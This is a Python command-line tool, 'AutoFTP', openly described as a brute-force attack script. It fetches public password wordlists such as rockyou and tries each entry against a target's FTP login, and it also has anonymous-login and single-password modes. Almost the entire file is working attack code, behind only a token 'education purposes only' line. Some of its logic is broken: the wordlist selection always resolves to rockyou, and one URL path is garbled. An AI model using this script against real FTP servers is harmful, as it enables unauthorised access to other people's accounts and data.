#!/bin/python3
#-*- coding: utf-8 -*-
# 5/26/21 --- Revised: 11/19/21
# AutoFTP is for education purposes only ! 
# 2015-2021 WaXxX <wax@Windows95>
import sys, time, os, argparse, requests, signal, re, threading, readline;
from ftplib import *;from time import sleep;from sys import exit;
from datetime import datetime;from threading import Thread;
WHITE=('\033[38;5;15m');
GREEN=('\033[38;5;46m');
DARK=('\033[38;5;245m');
BLUE=('\033[38;5;51m');
RED=('\033[38;5;1m');
BOLD=('\033[01m');
UNDERLINE=('\033[04m');
STRIKE=('\033[09m');
DIM=('\033[2m');
RESET=('\033[0m');
BLINK=('\033[5m');
Version=('V-0.2');
user = ('{0}'.format(os.environ['USER']));
script = (os.path.basename(sys.argv[0]));
readline.parse_and_bind("tab: complete")
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
lists = ({
'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt'#,
'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top207-probable-v2.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2020-200_most_used_passwords.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Most-Popular-Letter-Passes.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/bt4-password.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkc0de.txt',
'https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top1575.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt',
'https://raw.githubusercontent.com/praetorian-inc/Hob0Rules/master/wordlists/shortKrak.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt',
'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-CBLUEentials/10k-most-common.txt'
})
def complete(text,state):
    volcab = ['yes','no','anonymous','darkweb2017-top10000', 'milw0rm-dictionary',
				'10k-most-common', 'probable-v2-top1575', 'rockyou', 'Top207-probable-v2',
				'bt4-password', 'shortKrak', '2020-200_most_used_passwords', 'Most-Popular-Letter-Passes', 'darkc0de']
    results = [x for x in volcab if x.startswith(text)] + [None]
    return results[state]
readline.set_completer(complete)
def sigint_handler(signum, frame):
	print('\nExiting.')
	exit(0)
signal.signal(signal.SIGINT, sigint_handler)
def banner():
	os.system('clear')
	print ( DARK+' '*25+'╔══════════════════════╗' )
	print ( DARK+' '*25+'║'+BOLD+GREEN+' ┳━┓'+DARK+DIM+'┳ ┓┏┓┓┏━┓'+RESET+BOLD+BLUE+'┳━┓┏┓┓┳━┓'+DARK+'║' )
	print ( DARK+' '*25+'║'+BOLD+GREEN+' ┃━┫'+DARK+DIM+'┃ ┃ ┃ ┃ ┃'+RESET+BOLD+BLUE+'┣━  ┃ ┃━┛'+DARK+'║' )
	print ( DARK+' '*25+'║'+BOLD+GREEN+' ┛ ┇'+DARK+DIM+'┇━┛ ┇ ┛━┛'+RESET+BOLD+BLUE+'┇   ┇ ┇  '+DARK+'║' )
	print ( DARK+' '*25+'║'+BOLD+GREEN+DIM+f'	  {Version}'+RESET+BOLD+DARK+'	        ║' )
	print ( DARK+' '*25+'╚══════════════════════╝' )
	sleep(1)
	os.system('clear')
banner()
def echo_s(data):
	blank = ' '
	s = ''
	for l in blank:
		sys.stdout.write('\r')
		sys.stdout.write(DARK+'['+GREEN+'-'+WHITE+'*'+GREEN+'-'+DARK+'] '+'%s'%(data))
		s+='%s'%l
		sys.stdout.flush()
		sleep(0.001)
	print(DARK+' '*2+'['+GREEN+'-'+WHITE+'*'+GREEN+'-'+DARK+']')
def echo_f(data):
	blank = ' '
	s = ''
	for l in blank:
		sys.stdout.write('\r')
		sys.stdout.write(DARK+'['+WHITE+'-'+RED+'!'+WHITE+'-'+DARK+'] '+'%s'%(data))
		s+='%s'%l
		sys.stdout.flush()
		sleep(0.001)
	print(DARK+' '*2+'['+WHITE+'-'+RED+'!'+WHITE+'-'+DARK+']')
def Usage():
	print (f'''
{GREEN}Usage{WHITE} &&{GREEN} Info{WHITE}:{BLUE}
{GREEN}A{DARK}uto{BLUE}FTP {DARK}is a brute force attack script that has the feature of using local or remote wordlists{WHITE}.\n{DARK}A total of {UNDERLINE}{GREEN}17{RESET}{BOLD}{WHITE},{UNDERLINE}{GREEN}580{RESET}{BOLD}{WHITE},{UNDERLINE}{GREEN}792{RESET}{BOLD}{DARK}+ {DARK}words currently and more soon to come{WHITE} !
{GREEN}This script now has tab completion{WHITE}.\n{DARK}Press tab on any input function to see the auto-completions available {WHITE}!
{WHITE}# {BLUE}Local wordlist attack syntax{WHITE}:{GREEN}
{script} {DARK}-t {GREEN}192{WHITE}.{GREEN}168{WHITE}.{GREEN}56{WHITE}.{GREEN}104 {DARK}-u {GREEN}admin {DARK}-w {GREEN}dictionary{WHITE}.{GREEN}txt
{WHITE}# {BLUE}Remote wordlist mode syntax{WHITE}:{GREEN}
{script} {DARK}-t {GREEN}192{WHITE}.{GREEN}168{WHITE}.{GREEN}56{WHITE}.{GREEN}104 {DARK}-u {GREEN}admin {DARK}-s {GREEN}darkc0de{WHITE}.{GREEN}txt
{WHITE}# {BLUE}Anonymous login syntax{WHITE}:{GREEN}
{script} {DARK}-u {GREEN}anonymous {DARK}-t {GREEN}ftp{WHITE}.{GREEN}ed{WHITE}.{GREEN}ac{WHITE}.{GREEN}uk
{WHITE}# {BLUE}List all available remote wordlists and their word count{WHITE}:{GREEN}
{script} {DARK}-l
{WHITE}# {BLUE}Show an exact total remote word count{WHITE}:{GREEN}
{script} {DARK}-c
{WHITE}# {BLUE}Single password mode{WHITE}:{GREEN}
{script} {DARK}-p
''')
def	debuggin(j):
	print (f"debuggin' {j}")
	return
def do_now(target, *args, **kwargs):
	m = Thread(target = target, args = args, kwargs = kwargs)
	m.setDaemon(True)
	m.start()
	sleep(0.01)
class AutoFTP():
	def __init__ (self):
		self.session = requests.Session()
		self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'})
		parser = argparse.ArgumentParser(description=f'{WHITE}::{BLUE}AutoFTP Brute force FTP accounts{WHITE}::{GREEN}',add_help=False)
		parser.add_argument('-t', '--target',required=False, action='store', help=f"{GREEN}Target to brute force")
		parser.add_argument('-w', '--wordlist',required=False, action='store', help=f"{GREEN}Enter whole path to wordlist")
		parser.add_argument('-u', '--username',required=False, action='store', help=f"{GREEN}Username to use for attack")
		parser.add_argument('-s', '--scrape',required=False, action='store', help=f"{GREEN}Remotely scrape wordlists. Run -l/--list to see lists")
		parser.add_argument('-l', '--list',required=False,action='store_true',  help=f"{GREEN}View available online wordlists")
		parser.add_argument('-c', '--count',required=False,action='store_true',  help=f"{GREEN}Show the total available word count(Not necessary)")
		parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,help=f"{GREEN}Show this help menu")
		parser.add_argument('-p', '--password',required=False, action='store', help=f"{GREEN}Single password")
		args = parser.parse_args()
		self.total_lists = ( len( lists ) )
		if len(sys.argv) <= 1:
			Usage()
		if args.password:
			self.target = args.target
			if args.username:
				self.user = args.username
			else:
				data = ( f"{RED}No username supplied" )
				data += ( f"{WHITE} :: {BLUE}Enter a username now" )
				echo_f ( data )
				self.user = input( f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~ ]{WHITE}$ {BLUE} " )
			password = args.password
			self.singlePass(password)
		if args.count:
			self.total_lists = ( len( lists ) )
			#data = ( BOLD+DARK+'Getting a '+BLUE+UNDERLINE+'total word count'+RESET+DARK+BOLD+' of all'+BLUE+BOLD+' ('+WHITE+UNDERLINE+f'{int(self.total_lists)}'+RESET+BOLD+BLUE+')'+RESET+BOLD+DARK+' available remote wordlists'+RESET+BOLD )
			data = ( f"{BOLD}{DARK}Getting a {BLUE}{UNDERLINE}total word count{RESET}{DARK}{BOLD} of all{BLUE} ({WHITE}{UNDERLINE}{int(self.total_lists)}{RESET}{BOLD}{BLUE}){DARK} available remote wordlists" )
			echo_s ( data )
			self.TotalWords()
		if args.list:
			self.Wordlists()
		else:
			pass
		try:
			if len(args.target) <= 1:
				#data = ( BLUE+'No target supplied' )
				data = ( f"{BLUE}No target supplied" )
				echo_f ( data )
			else:
				self.target = args.target;
		except:
			pass
		try:
			if len( args.username ) <= 1:
				#data = ( BLUE+'No username supplied' )
				data = ( f"{BLUE}No username supplied" )
				echo_f ( data )
		except:
			pass
		try:
			if 'anon' in args.username:
				self.user = 'anonymous'
				self.anonymous()
		except:
			pass
		else:
			self.user = args.username
			if args.scrape:
				wordlist = args.scrape
				#data = ( DARK+'Using remote dictionary mode' )
				data = ( f"{DARK}Using a remote wordlist" )
				echo_s ( data )
				self.Scrape(wordlist)
			elif args.wordlist:
				wordlist = args.wordlist
				#data = ( DARK+'Using a local wordlist'+BLUE+':'+WHITE+f' {wordlist}' )
				data = ( f"{DARK}Using a local wordlist{BLUE}:{WHITE} {wordlist}" )
				echo_s ( data )
				self.Local( wordlist )
	def anonymous(self):
		dirs = []
		try:
			ftp=FTP( self.target )
			ftp.login( 'anonymous','anonymous' )
			data = ( str(f'Anonymous FTP login was successful @ {self.target}' ) )
			echo_s ( data )
			ftp.quit()
			return True
		except Exception as e:
			data = ( str(f'Anonymous FTP login @{self.target} failed') )
			echo_f ( data )
			return False
	def	singlePass(self, password):
		tries = int(1)
		total_words = int(1)
		data = (f"{WHITE}#{tries} {DARK}Trying login{BLUE}:{WHITE} {self.user}{BLUE}:{WHITE}{password}{DARK} against{BLUE}:{WHITE} {self.target}{BLUE} {round((tries/total_words)*100, 2)}%")
		echo_s ( data )
		try:
			ftp = FTP( self.target )
			ftp.login( self.user, password )
			data = ( f"{GREEN}Success{BLUE}: {WHITE}#{DARK}Pass{WHITE}: {GREEN}{password}{WHITE} #{DARK}User{WHITE}: {GREEN}{self.user} {WHITE}#{DARK}Target{WHITE}: {GREEN}{self.target}")
			echo_s ( data )
			ftp.quit()
			quit
			return True
		except:
			pass
	def TotalWords(self):
		# 4,701,158 words
		start = time.time()
		final_count = 0
		sys.setrecursionlimit(1000000)
		for total in lists:
			get = self.session.get( total, headers=headers ).text
			words = re.findall('([0-9A-Za-z _\+#$@!&<?>\'"}*{\(\)?%.;:, -:]+)',get)
			sort = list(set( words ));
			l_words = len(sort)
			final_count += ( l_words )
			do_now(target=self.session.get,**{'url':total,'data':str(words)})
		end = time.time()
		elapsed = (int( end - start ))
		#data = ( BOLD+DARK+DIM+'There are '+BOLD+RESET+WHITE+f'{self.total_lists}'+DARK+DIM+BOLD+' available wordlists with'+RESET+BOLD+WHITE+f' {final_count}'+DARK+'. Fetched in '+RESET+WHITE+BOLD+f'{elapsed}'+DARK+' seconds' )
		data = ( f"{BOLD}{DARK}There's {WHITE}{self.total_lists}{DARK} available wordlists with {WHITE}{final_count}{BLUE}.{DARK} Fetched in {WHITE}{elapsed}{DARK} seconds")
		echo_s ( data )
	def Wordlists(self):
		#data = ( BOLD+DARK+'Listing all'+BLUE+' ('+WHITE+UNDERLINE+f'{int(self.total_lists)}'+RESET+BOLD+BLUE+')'+RESET+BOLD+DARK+' available remote wordlists'+RESET+BOLD )
		data = ( f"{BOLD}{DARK}Listing all{BLUE} ({WHITE}{UNDERLINE}{int(self.total_lists)}{RESET}{BOLD}{BLUE}){DARK} available remote wordlists" )
		echo_s ( data )
		wordlits = [
					'darkweb2017-top10000',
					'milw0rm-dictionary',
					'10k-most-common',
					'probable-v2-top1575',
					'rockyou',
					'Top207-probable-v2',
					'bt4-password',
					'shortKrak',
					'2020-200_most_used_passwords',
					'Most-Popular-Letter-Passes',
					'darkc0de'
		]
		data = ( f"{DARK}Wordlist{BLUE}: darkweb2017-top10000{DARK} contains{BLUE}:{WHITE} 9954{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: milw0rm-dictionary{DARK} contains{BLUE}:{WHITE} 84193{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: 10k-most-common{DARK} contains{BLUE}:{WHITE} 10000{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: probable-v2-top1575{DARK} contains{BLUE}:{WHITE} 1575{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: rockyou{DARK} contains{BLUE}:{WHITE} 14323092{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: Top207-probable-v2{DARK} contains{BLUE}:{WHITE} 207{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: bt4-password{DARK} contains{BLUE}:{WHITE} 1647019{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: shortKrak{DARK} contains{BLUE}:{WHITE} 3593{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: 2020-200_most_used_passwords{DARK} contains{BLUE}:{WHITE} 197{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: Most-Popular-Letter-Passes{DARK} contains{BLUE}:{WHITE} 47423{DARK} words" )
		echo_s ( data )
		data = ( f"{DARK}Wordlist{BLUE}: darkc0de{DARK} contains{BLUE}:{WHITE} 1464905{DARK} words" )
		echo_s ( data )
		"""
		start = time.time()
		for link in lists:
			cut1 = link.rsplit( '/',1 )[-1]
			wordlist = cut1.rsplit( '.txt',1 )[-2]
			page = self.session.get( link, headers=headers ).text
			passwords = re.findall('([0-9A-Za-z _\+#$@!&<?>\'"}*{\(\)?%.;:, -:]+)',page)
			passlist = list(set( passwords ));
			total_words = len( passlist )
			if wordlist == ( 'probable-v2-top1575' ):
				total_words = 1575
			do_now(target=self.session.get,**{'url':link,'data':str(passwords)})
			#data = ( DARK+'Wordlist'+BLUE+':'+WHITE+f' {wordlist}'+DARK+' contains'+BLUE+':'+WHITE+f' {total_words}'+DARK+' words' )
			data = ( f"{DARK}Wordlist{BLUE}:{WHITE} {wordlist}{DARK} contains{BLUE}:{WHITE} {total_words}{DARK} words")
			echo_s ( data )
		end = time.time()
		elapsed = (int( end - start ))
	"""

	# 🠋 Not sure whether I'm keeping 🠋
		#data = ( DARK+'Choose wordlist and start attack now '+BLUE+'? '+DARK+'['+BLUE+'yes'+WHITE+'/'+BLUE+'no'+DARK+']' )
		data = ( f"{DARK}Choose a wordlist and start attack now{BLUE} ?{DARK} [{BLUE}yes{WHITE}/{RED}no{DARK}]" )
		echo_s ( data )
		#answer = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~ '+BLUE+']'+WHITE+'$ '+BLUE+' ')
		answer = input( f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~ ]{WHITE}$ {BLUE} " )
		if 'n'.upper() in answer or 'n'.lower() in answer:
			#data = ( DARK+'Use '+BLUE+'`'+DARK+'autoftp '+BLUE+'-u'+DARK+' <'+BLUE+'user'+DARK+'> '+BLUE+'-t '+DARK+'<'+BLUE+'target'+DARK+'>'+WHITE+' ['+BLUE+'-w'+DARK+' <'+BLUE+'local_wordlist'+DARK+'> '+WHITE+'/ '+BLUE+'-o '+DARK+'<'+BLUE+'remote_wordlist'+DARK+'>'+WHITE+']'+BLUE+'`')
			data = ( f"{DARK}Use {BLUE}'{DARK}{script}{BLUE} -u{DARK} <{BLUE}user{DARK}>{BLUE} -t {DARK}<{BLUE}target{DARK}>{WHITE} [{BLUE}-w{DARK} <{BLUE}local_wordlist{DARK}> {WHITE}/{BLUE} -s{DARK} <{BLUE}remote_wordlist{DARK}>{WHITE}]{BLUE}'")
			echo_f(data)
		elif 'y'.upper() in answer or 'y'.lower() in answer:
			data = ( f"{DARK}Enter the wordlist you'd like to use" )
			echo_s ( data )
			#wordlist = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~ '+BLUE+']'+WHITE+'$'+BLUE+' ')
			wordlist = input(f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~ ]{WHITE}${BLUE} ")
			ps1updte=wordlist#.rsplit('.',1)[-2]
			#data = ( DARK+'Enter the target\'s IP or domain name' )
			data = ( f"{DARK}Enter the target's IP or domain name" )
			echo_s ( data )
			#self.target = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~/'+WHITE+f'{ps1updte} '+BLUE+']'+WHITE+'$'+BLUE+' ')
			self.target = input(f"{BLUE}[{DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~/{WHITE}{ps1updte} {BLUE}]{WHITE}${BLUE} ")
			data = ( f"{DARK}Enter the username" )
			echo_s ( data )
			#self.user = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~/'+WHITE+f'{ps1updte}'+BLUE+'/'+WHITE+f'{self.target} '+BLUE+']'+WHITE+'$'+BLUE+' ')
			self.user = input( f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~/{WHITE}{ps1updte}{BLUE}/{WHITE}{self.target} {BLUE}]{WHITE}$ {BLUE}" )
			self.Scrape( wordlist )
	# 🠉 End of not sure 🠉

	def Scrape(self,wordlist):
		tries = 0
		headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
		if 'rockyou'.lower() or 'rockyou'.upper() in wordlist:
			link = ('https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt')
		elif 'darkc0de'.lower() or 'darkc0de'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkc0de.txt')
		elif 'bt4-password'.lower() or 'bt4-password'.upper()  in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/bt4-password.txt')
		elif 'shortKrak'.lower() or 'shortKrak'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/praetorian-inc/Hob0Rules/master/wordlists/shortKrak.txt')
		elif 'Top12Thousand-probable-v2'.lower() or 'Top12Thousand-probable-v2'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt')
		elif 'Most-Popular-Letter-Passes'.lower() or 'Most-Popular-Letter-Passes'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Most-Popular-Letter-Passes.txt')
		elif '2020-200_most_used_passwords'.lower() or '2020-200_most_used_passwords'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2020-200_most_used_passwords.txt')
		elif 'milw0rm-dictionary'.lower() or 'milw0rm-dictionary'.upper()  in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt')
		elif 'probable-v2-top1575'.lower() or 'probable-v2-top1575'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top1575.txt')
		elif 'probable-v2-top207'.lower() or 'probable-v2-top207'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top207.txt')
		elif 'darkweb2017-top10000'.lower() or 'darkweb2017-top10000'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt')
		elif '10k-most-common'.lower() or '10k-most-common'.upper() in wordlist:
			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-CBLUEentials/10k-most-common.txt')
		else:
			#data = ( BLINK+BLUE+BOLD+DIM+'Oops ! Something went wrong'+RESET+BOLD )
			data = ( f"{BLINK}{BLUE}{BOLD}{DIM}Oops ! Something went wrong{RESET}{BOLD}")
			echo_f ( data )
		page = self.session.get(link,headers=headers).text
		passwords = list(set(re.findall('([0-9A-Za-z _\+#$@!&<?>\'"}*{\(\)?%.;:, -:]+)',page)))
		total_words = len( passwords )
		if wordlist == ( 'probable-v2-top1575' ):
			total_words = 1575
		elif wordlist == ( '10k-most-common' ):
			total_words = 10000
		elif wordlist == ( 'Top207-probable-v2' ):
			total_words = 207
		#data = ( DARK+'Wordlist'+BLUE+': '+WHITE+f'{wordlist}'+DARK+' contains'+BLUE+': '+WHITE+f'{total_words}'+DARK+' words' )
		data = ( f"{DARK}Wordlist{BLUE}:{WHITE} {wordlist}{DARK} contains{BLUE}:{WHITE} {total_words}{DARK} words")
		echo_s ( data )
		for password in passwords:
			tries += 1
			#data = ( WHITE+f'#{tries} '+DARK+'Trying password'+BLUE+': '+WHITE+f'{password} '+DARK+'against'+BLUE+': '+WHITE+f'{self.target} '+BLUE+f'{round((tries/total_words)*100, 2)}%' )
			data = (f"{WHITE}#{tries} {DARK}Trying password{BLUE}:{WHITE} {password}{DARK} against{BLUE}:{WHITE} {self.target}{BLUE} {round((tries/total_words)*100, 2)}%")
			echo_s ( data )
			do_now(target=self.session.get,**{'url':link,'data':str(passwords)})
			try:
				ftp = FTP( self.target )
				ftp.login( self.user, password )
				data = ( f"{GREEN}Success{BLUE}: {WHITE}#{DARK}Pass{WHITE}: {GREEN}{password}{WHITE} #{DARK}User{WHITE}: {GREEN}{self.user} {WHITE}#{DARK}Target{WHITE}: {GREEN}{self.target}")
				echo_s ( data )
				ftp.quit()
				quit
				return True
			except:
				pass
	def Local( self, wordlist ):
		start = time.time()
		tries = 0
		input_file = open(f"{wordlist}", errors="surrogateescape")
		passwords = input_file.readlines()
		total_words = len( passwords )
		#data = ( DARK+'Wordlist'+BLUE+': '+WHITE+f'{wordlist}'+DARK+' contains'+BLUE+': '+WHITE+f'{total_words}'+DARK+' words' )
		data = ( f"{DARK}Wordlist{BLUE}:{WHITE} {wordlist}{DARK} contains{BLUE}:{WHITE} {total_words}{DARK} words")
		echo_s ( data )
		for password in passwords:
			tries += 1
			#data = ( WHITE+f'#{tries} '+DARK+'Trying password'+BLUE+': '+WHITE+f'{password}{DARK} against{BLUE}: '+WHITE+f'{self.target} '+BLUE+f'{round((tries/total_words)*100, 2)}%' )
			data = (f"{WHITE}#{tries} {DARK}Trying password{BLUE}:{WHITE} {password}{DARK} against{BLUE}:{WHITE} {self.target}{BLUE} {round((tries/total_words)*100, 2)}%")
			echo_s ( data )
			try:
				ftp = FTP( self.target )
				ftp.login( self.user, password )
				data = ( f"{GREEN}Success{BLUE}: {WHITE}#{DARK}Pass{WHITE}: {GREEN}{password}{WHITE} #{DARK}User{WHITE}: {GREEN}{self.user} {WHITE}#{DARK}Target{WHITE}: {GREEN}{self.target}")
				echo_s ( data )
				ftp.quit()
				break
			except:
				pass
		end = time.time()
		elapsed = int( end - start )
AutoFTP()
